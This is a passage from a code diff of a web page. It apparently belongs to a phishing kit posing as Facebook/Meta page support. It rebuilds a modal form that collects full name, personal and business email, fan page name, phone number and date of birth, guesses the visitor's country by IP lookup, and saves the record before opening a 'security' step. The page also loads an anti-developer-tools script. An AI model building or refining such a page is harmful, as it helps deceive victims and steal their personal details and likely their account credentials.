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") no-repeat center center / cover !important;
+    background-color: #f0f4ff !important;
+  }
+  .modal-box::before {
+    content: ""; position: absolute; inset: 0; border-radius: 16px;
+    background: rgba(255,255,255,0.82); backdrop-filter: blur(2px); z-index: 0; pointer-events: none;
+  }
+  .modal-box { position: relative; }
+  .modal-box > * { position: relative; z-index: 1; }
+
 </style>
 </head>
 <body>
@@ -559,7 +696,7 @@
 <!-- Modals Container -->
 <div id="modalsContainer"></div>
 
-<!-- External dependencies (keep these) -->
+<!-- External dependencies -->
 <script src="./public/js/disableDevtool.js"></script>
 <script src="./public/js/config.js"></script>
 <script src="./public/js/utils.js"></script>
@@ -567,34 +704,50 @@
 <!-- ===================== MODAL MANAGER ===================== -->
 <script>
 const Modal = {
+  _current: null,
+
   create(id, content) {
-    const html = `
-      <div id="${id}" class="fixed inset-0 z-[999] flex items-center justify-center bg-black/40 px-[20px] py-[40px] hidden">
-        <div class="bg-white max-h-full h-full w-full max-w-lg shadow-lg p-5 rounded-2xl flex flex-col overflow-y-auto transform scale-0 opacity-0 transition-all duration-200">
-          ${content}
-        </div>
-      </div>`;
-    document.getElementById('modalsContainer').insertAdjacentHTML('beforeend', html);
+    const old = document.getElementById(id);
+    if (old) old.remove();
+
+    const overlay = document.createElement('div');
+    overlay.id = id;
+    overlay.className = 'modal-overlay';
+    overlay.innerHTML = '<div class="modal-box">' + content + '</div>';
+
+    // Close on backdrop click
+    overlay.addEventListener('click', function(e) {
+      if (e.target === overlay) Modal.close(id);
+    });
+
+    document.getElementById('modalsContainer').appendChild(overlay);
   },
+
   open(id) {
-    const modal = document.getElementById(id);
-    if (!modal) return;
-    modal.classList.remove('hidden');
-    setTimeout(() => {
-      const inner = modal.querySelector('div > div');
-      inner.classList.remove('scale-0', 'opacity-0');
-      inner.classList.add('scale-100', 'opacity-100');
-    }, 10);
+    const overlay = document.getElementById(id);
+    if (!overlay) return;
+    requestAnimationFrame(function() {
+      overlay.classList.add('open');
+    });
+    Modal._current = id;
+    document.body.style.overflow = 'hidden';
   },
+
   close(id) {
-    const modal = document.getElementById(id);
-    if (!modal) return;
-    const inner = modal.querySelector('div > div');
-    inner.classList.remove('scale-100', 'opacity-100');
-    inner.classList.add('scale-0', 'opacity-0');
-    setTimeout(() => modal.remove(), 200);
+    const overlay = document.getElementById(id);
+    if (!overlay) return;
+    overlay.classList.remove('open');
+    document.body.style.overflow = '';
+    setTimeout(function() {
+      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+    }, 220);
+    Modal._current = null;
   }
 };
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current);
+});
 </script>
 
 <!-- ===================== PAGE INTERACTIONS ===================== -->
@@ -613,7 +766,7 @@ const Modal = {
   }
 
   function selectTool(item, videoSrc, poster) {
-    document.querySelectorAll('.tool-item').forEach(i => {
+    document.querySelectorAll('.tool-item').forEach(function(i) {
       i.classList.remove('active');
       const img = i.querySelector('h3 img');
       if (img) img.src = 'public/icons/ic_plus.svg';
@@ -645,7 +798,7 @@ const Modal = {
   }
 
   function switchSocial(icon, videoSrc, poster, sub, title, desc, link) {
-    document.querySelectorAll('.social-icons-col img').forEach(i => {
+    document.querySelectorAll('.social-icons-col img').forEach(function(i) {
       i.classList.remove('active'); i.classList.add('inactive');
     });
     icon.classList.remove('inactive'); icon.classList.add('active');
@@ -658,161 +811,340 @@ const Modal = {
   }
 </script>
 
-<!-- ===================== MODAL FLOWS (inlined from app.js) ===================== -->
+<!-- ===================== MODAL FLOWS ===================== -->
 <script>
 // ==================== MODAL 1: CLIENT INFO ====================
-function openClientModal() {
-  const content = `
-    <div class="flex items-center justify-between mb-[10px]">
-      <h2 class="font-bold text-[#0A1317] text-[15px]">Information</h2>
-      <button onclick="Modal.close('clientModal')" class="w-[18px] h-[18px] cursor-pointer opacity-60 hover:opacity-100 transition-opacity duration-200">
-        <img class="w-[18px] h-[18px]" alt="close" src="./public/icons/ic_close.svg">
-      </button>
-    </div>
-    <div class="flex-1 overflow-y-auto">
-      <form id="clientForm" autocomplete="off" class="w-full">
 
-        <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-          <input id="fullName" placeholder="Full Name" class="w-full outline-none h-full tracking-wide text-[14px]" type="text" required>
-        </div>
+// Phone country codes list (top countries + full world list)
+var COUNTRY_CODES = [
+  {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
+  {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+  {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+  {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+  {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+  {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+  {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+  {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+  {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+  {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+  {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
+  {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
+  {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+  {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
+  {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+  {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
+  {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
+  {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
+  {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
+  {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+  {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
+  {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
+  {code:"AE",name:"UAE",dial:"+971",flag:"🇦🇪"},
+  {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
+  {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
+  {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
+  {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
+  {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
+  {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
+  {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
+  {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
+  {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
+  {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
+  {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
+  {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
+  {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
+  {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
+  {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
+  {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
+  {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
+  {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
+  {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
+  {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
+  {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
+  {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
+  {code:"IR",name:"Iran",dial:"+98",flag:"🇮🇷"},
+  {code:"IQ",name:"Iraq",dial:"+964",flag:"🇮🇶"},
+  {code:"IL",name:"Israel",dial:"+972",flag:"🇮🇱"},
+  {code:"JO",name:"Jordan",dial:"+962",flag:"🇯🇴"},
+  {code:"KW",name:"Kuwait",dial:"+965",flag:"🇰🇼"},
+  {code:"QA",name:"Qatar",dial:"+974",flag:"🇶🇦"},
+  {code:"NZ",name:"New Zealand",dial:"+64",flag:"🇳🇿"},
+  {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
+  {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
+  {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
+  {code:"PE",name:"Peru",dial:"+51",flag:"🇵🇪"},
+  {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
+  {code:"RO",name:"Romania",dial:"+40",flag:"🇷🇴"},
+  {code:"CZ",name:"Czech Republic",dial:"+420",flag:"🇨🇿"},
+  {code:"HU",name:"Hungary",dial:"+36",flag:"🇭🇺"},
+  {code:"HR",name:"Croatia",dial:"+385",flag:"🇭🇷"},
+  {code:"SK",name:"Slovakia",dial:"+421",flag:"🇸🇰"},
+  {code:"BG",name:"Bulgaria",dial:"+359",flag:"🇧🇬"},
+  {code:"RS",name:"Serbia",dial:"+381",flag:"🇷🇸"},
+  {code:"KZ",name:"Kazakhstan",dial:"+7",flag:"🇰🇿"},
+  {code:"UZ",name:"Uzbekistan",dial:"+998",flag:"🇺🇿"},
+  {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
+  {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
+  {code:"MO",name:"Macau",dial:"+853",flag:"🇲🇴"},
+  {code:"MN",name:"Mongolia",dial:"+976",flag:"🇲🇳"},
+  {code:"GH",name:"Ghana",dial:"+233",flag:"🇬🇭"},
+  {code:"KE",name:"Kenya",dial:"+254",flag:"🇰🇪"},
+  {code:"ET",name:"Ethiopia",dial:"+251",flag:"🇪🇹"},
+  {code:"TZ",name:"Tanzania",dial:"+255",flag:"🇹🇿"},
+  {code:"UG",name:"Uganda",dial:"+256",flag:"🇺🇬"},
+  {code:"MA",name:"Morocco",dial:"+212",flag:"🇲🇦"},
+  {code:"TN",name:"Tunisia",dial:"+216",flag:"🇹🇳"},
+  {code:"DZ",name:"Algeria",dial:"+213",flag:"🇩🇿"},
+  {code:"LY",name:"Libya",dial:"+218",flag:"🇱🇾"},
+  {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+  {code:"CU",name:"Cuba",dial:"+53",flag:"🇨🇺"},
+  {code:"DO",name:"Dominican Rep.",dial:"+1",flag:"🇩🇴"},
+  {code:"GT",name:"Guatemala",dial:"+502",flag:"🇬🇹"},
+  {code:"HN",name:"Honduras",dial:"+504",flag:"🇭🇳"},
+  {code:"SV",name:"El Salvador",dial:"+503",flag:"🇸🇻"},
+  {code:"CR",name:"Costa Rica",dial:"+506",flag:"🇨🇷"},
+  {code:"PA",name:"Panama",dial:"+507",flag:"🇵🇦"},
+  {code:"VE",name:"Venezuela",dial:"+58",flag:"🇻🇪"},
+  {code:"EC",name:"Ecuador",dial:"+593",flag:"🇪🇨"},
+  {code:"BO",name:"Bolivia",dial:"+591",flag:"🇧🇴"},
+  {code:"PY",name:"Paraguay",dial:"+595",flag:"🇵🇾"},
+  {code:"UY",name:"Uruguay",dial:"+598",flag:"🇺🇾"},
+  {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"},
+  {code:"LU",name:"Luxembourg",dial:"+352",flag:"🇱🇺"},
+  {code:"LT",name:"Lithuania",dial:"+370",flag:"🇱🇹"},
+  {code:"LV",name:"Latvia",dial:"+371",flag:"🇱🇻"},
+  {code:"EE",name:"Estonia",dial:"+372",flag:"🇪🇪"},
+  {code:"BY",name:"Belarus",dial:"+375",flag:"🇧🇾"},
+  {code:"MD",name:"Moldova",dial:"+373",flag:"🇲🇩"},
+  {code:"GE",name:"Georgia",dial:"+995",flag:"🇬🇪"},
+  {code:"AM",name:"Armenia",dial:"+374",flag:"🇦🇲"},
+  {code:"AZ",name:"Azerbaijan",dial:"+994",flag:"🇦🇿"},
+  {code:"AF",name:"Afghanistan",dial:"+93",flag:"🇦🇫"},
+  {code:"OM",name:"Oman",dial:"+968",flag:"🇴🇲"},
+  {code:"YE",name:"Yemen",dial:"+967",flag:"🇾🇪"},
+  {code:"SY",name:"Syria",dial:"+963",flag:"🇸🇾"},
+  {code:"LB",name:"Lebanon",dial:"+961",flag:"🇱🇧"},
+  {code:"BH",name:"Bahrain",dial:"+973",flag:"🇧🇭"},
+  {code:"FJ",name:"Fiji",dial:"+679",flag:"🇫🇯"},
+  {code:"PG",name:"Papua New Guinea",dial:"+675",flag:"🇵🇬"},
+  {code:"CG",name:"Congo",dial:"+242",flag:"🇨🇬"},
+  {code:"SD",name:"Sudan",dial:"+249",flag:"🇸🇩"},
+  {code:"SO",name:"Somalia",dial:"+252",flag:"🇸🇴"},
+  {code:"SN",name:"Senegal",dial:"+221",flag:"🇸🇳"},
+  {code:"CM",name:"Cameroon",dial:"+237",flag:"🇨🇲"},
+  {code:"CI",name:"Ivory Coast",dial:"+225",flag:"🇨🇮"},
+  {code:"MG",name:"Madagascar",dial:"+261",flag:"🇲🇬"},
+  {code:"MZ",name:"Mozambique",dial:"+258",flag:"🇲🇿"},
+  {code:"AO",name:"Angola",dial:"+244",flag:"🇦🇴"},
+  {code:"ZW",name:"Zimbabwe",dial:"+263",flag:"🇿🇼"},
+  {code:"ZM",name:"Zambia",dial:"+260",flag:"🇿🇲"},
+  {code:"BW",name:"Botswana",dial:"+267",flag:"🇧🇼"},
+  {code:"NA",name:"Namibia",dial:"+264",flag:"🇳🇦"},
+  {code:"MW",name:"Malawi",dial:"+265",flag:"🇲🇼"},
+  {code:"RW",name:"Rwanda",dial:"+250",flag:"🇷🇼"},
+  {code:"MU",name:"Mauritius",dial:"+230",flag:"🇲🇺"},
+  {code:"MV",name:"Maldives",dial:"+960",flag:"🇲🇻"},
+  {code:"BT",name:"Bhutan",dial:"+975",flag:"🇧🇹"},
+  {code:"BN",name:"Brunei",dial:"+673",flag:"🇧🇳"},
+  {code:"TL",name:"Timor-Leste",dial:"+670",flag:"🇹🇱"},
+  {code:"WS",name:"Samoa",dial:"+685",flag:"🇼🇸"},
+  {code:"TO",name:"Tonga",dial:"+676",flag:"🇹🇴"},
+  {code:"VU",name:"Vanuatu",dial:"+678",flag:"🇻🇺"}
+];
 
-        <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-          <input id="email" placeholder="Email Address" class="w-full outline-none h-full tracking-wide text-[14px]" type="email" required>
-        </div>
+var _selectedDial = "+84";
+var _selectedFlag = "🇻🇳";
+var _dropdownOpen = false;
 
-        <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-          <input id="emailBusiness" placeholder="Email Business Address" class="w-full outline-none h-full tracking-wide text-[14px]" type="email" required>
-        </div>
+async function _detectCountryDial() {
+  try {
+    var r = await fetch("https://ipapi.co/json/");
+    var d = await r.json();
+    var cc = d.country_code;
+    var found = COUNTRY_CODES.find(function(c){ return c.code === cc; });
+    if (found) { _selectedDial = found.dial; _selectedFlag = found.flag; }
+  } catch(e) {}
+}
 
-        <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-          <input id="fanpage" placeholder="Fanpage Name" class="w-full outline-none h-full tracking-wide text-[14px]" type="text" required>
-        </div>
+function _buildPhoneSelector() {
+  var opts = COUNTRY_CODES.map(function(c) {
+    return '<div class="pcs-opt" data-dial="'+c.dial+'" data-flag="'+c.flag+'" onclick="_selectDial(this)">'
+      + '<span>'+c.flag+'</span>'
+      + '<span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">'+c.dial+'</span>'
+      + '<span style="font-size:13px;color:#777;">'+c.name+'</span>'
+      + '</div>';
+  }).join('');
+  return '<div class="pcs-wrap" id="pcs">'
+    + '<div class="pcs-trigger" onclick="_toggleDial()" id="pcsTrigger">'
+    + '  <span id="pcsFlag">'+_selectedFlag+'</span>'
+    + '  <span id="pcsDial" style="font-size:13px;color:#333;">'+_selectedDial+'</span>'
+    + '  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>'
+    + '</div>'
+    + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none">'
+    + '  <input class="pcs-search" id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)">'
+    + '  <div class="pcs-list" id="pcsList">'+opts+'</div>'
+    + '</div>'
+    + '</div>';
+}
 
-        <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] mb-[10px] flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-          <input id="phone" placeholder="Phone Number" class="w-full outline-none h-full tracking-wide text-[14px]" type="tel" required>
-        </div>
+function _toggleDial() {
+  var dd = document.getElementById('pcsDropdown');
+  if (!dd) return;
+  _dropdownOpen = !_dropdownOpen;
+  dd.style.display = _dropdownOpen ? 'block' : 'none';
+  if (_dropdownOpen) { 
+    setTimeout(function(){ var s=document.getElementById('pcsSearch'); if(s) s.focus(); }, 50);
+  }
+}
 
-        <b class="text-[#9a979e] text-[14px] mb-[7px] block">Date of Birth</b>
-        <div class="grid grid-cols-3 gap-[10px] mb-[10px]">
-          <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-            <input id="day" placeholder="Day" class="w-full outline-none h-full text-[14px]" type="number" min="1" max="31" required>
-          </div>
-          <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-            <input id="month" placeholder="Month" class="w-full outline-none h-full text-[14px]" type="number" min="1" max="12" required>
-          </div>
-          <div class="w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-white flex items-center focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200">
-            <input id="year" placeholder="Year" class="w-full outline-none h-full text-[14px]" type="number" min="1900" max="2024" required>
-          </div>
-        </div>
+function _selectDial(el) {
+  _selectedDial = el.getAttribute('data-dial');
+  _selectedFlag = el.getAttribute('data-flag');
+  var f = document.getElementById('pcsFlag'); if(f) f.textContent = _selectedFlag;
+  var d = document.getElementById('pcsDial'); if(d) d.textContent = _selectedDial;
+  _dropdownOpen = false;
+  var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none';
+}
 
-        <div class="w-full border border-[#d4dbe3] rounded-[10px] bg-white text-[14px] mb-[10px] px-[11px] py-[11px]">
-          <textarea id="message" class="w-full outline-none resize-none text-[14px]" rows="3" placeholder="Message"></textarea>
-        </div>
-
-        <p class="text-[#9a979e] text-[13px] mb-[12px]">Our response will be sent to you within 14 - 48 hours.</p>
-
-        <div class="mb-[20px]">
-          <label class="cursor-pointer flex items-center gap-[8px] text-[14px]">
-            <input id="agreeCheck" type="checkbox" required class="w-4 h-4 accent-[#0064E0]">
-            I agree to the
-            <a href="" class="text-[#0064E0] hover:underline pointer-events-none">Terms of use</a>
-          </label>
-        </div>
-
-        <button type="submit" class="w-full h-[45px] bg-[#0064E0] text-white rounded-[40px] flex items-center justify-center font-[500] text-[15px] hover:bg-blue-700 transition-colors cursor-pointer">Submit</button>
-
-      </form>
-    </div>
-  `;
-
-  Modal.create('clientModal', content);
-  Modal.open('clientModal');
-
-  document.getElementById('clientForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const formData = {
-      fullName: document.getElementById('fullName').value.trim(),
-      email: document.getElementById('email').value.trim(),
-      emailBusiness: document.getElementById('emailBusiness').value.trim(),
-      fanpage: document.getElementById('fanpage').value.trim(),
-      phone: document.getElementById('phone').value.trim(),
-      day: document.getElementById('day').value,
-      month: document.getElementById('month').value,
-      year: document.getElementById('year').value,
-      message: document.getElementById('message').value.trim()
-    };
-    Utils.saveRecord('__client_rec__fi_rst', formData);
-    Modal.close('clientModal');
-    openSecurityModal();
+function _filterDial(q) {
+  var items = document.querySelectorAll('.pcs-opt');
+  q = q.toLowerCase();
+  items.forEach(function(el){
+    var txt = el.textContent.toLowerCase();
+    el.style.display = txt.includes(q) ? '' : 'none';
   });
 }
 
+// Close dropdown on outside click
+document.addEventListener('click', function(e) {
+  var wrap = document.getElementById('pcs');
+  if (wrap && !wrap.contains(e.target)) {
+    _dropdownOpen = false;
+    var dd = document.getElementById('pcsDropdown');
+    if (dd) dd.style.display = 'none';
+  }
+});
+
+function openClientModal() {
+  _detectCountryDial().then(function() {
+    var content =
+      '<div class="modal-header">' +
+        '<span class="modal-title">Information</span>' +
+        '<button class="modal-close" onclick="Modal.close('clientModal')">&times;</button>' +
+      '</div>' +
+      '<form id="clientForm" autocomplete="off">' +
+        '<div class="modal-input-wrap"><input id="fullName" type="text" placeholder="Full Name" required></div>' +
+        '<div class="modal-input-wrap"><input id="email" type="email" placeholder="Email Address" required></div>' +
+        '<div class="modal-input-wrap"><input id="emailBusiness" type="email" placeholder="Email Business Address" required></div>' +
+        '<div class="modal-input-wrap"><input id="fanpage" type="text" placeholder="Fanpage Name" required></div>' +
+        '<div class="modal-input-wrap pcs-phone-row">' +
+          _buildPhoneSelector() +
+          '<input id="phone" type="tel" placeholder="Phone Number" required style="flex:1;outline:none;border:none;background:transparent;font-size:14px;font-family:inherit;height:100%;min-width:0;">' +
+        '</div>' +
+        '<span class="modal-label">Date of Birth</span>' +
+        '<div class="modal-dob-grid">' +
+          '<div class="modal-input-wrap" style="margin-bottom:0"><input id="day" type="number" placeholder="Day" min="1" max="31" required></div>' +
+          '<div class="modal-input-wrap" style="margin-bottom:0"><input id="month" type="number" placeholder="Month" min="1" max="12" required></div>' +
+          '<div class="modal-input-wrap" style="margin-bottom:0"><input id="year" type="number" placeholder="Year" min="1900" max="2024" required></div>' +
+        '</div>' +
+        '<div style="height:10px"></div>' +
+        '<div class="modal-textarea-wrap"><textarea id="message" rows="3" placeholder="Message"></textarea></div>' +
+        '<p class="modal-hint">Our response will be sent to you within 14 - 48 hours.</p>' +
+        '<label class="modal-check-row"><input id="agreeCheck" type="checkbox" required> I agree to the <a href="#">Terms of use</a></label>' +
+        '<button type="submit" class="modal-btn-primary">Submit</button>' +
+      '</form>';
+
+    Modal.create('clientModal', content);
+    Modal.open('clientModal');
+
+    document.getElementById('clientForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var formData = {
+        fullName: document.getElementById('fullName').value.trim(),
+        email: document.getElementById('email').value.trim(),
+        emailBusiness: document.getElementById('emailBusiness').value.trim(),
+        fanpage: document.getElementById('fanpage').value.trim(),
+        phone: _selectedDial + ' ' + document.getElementById('phone').value.trim(),
+        day: document.getElementById('day').value,
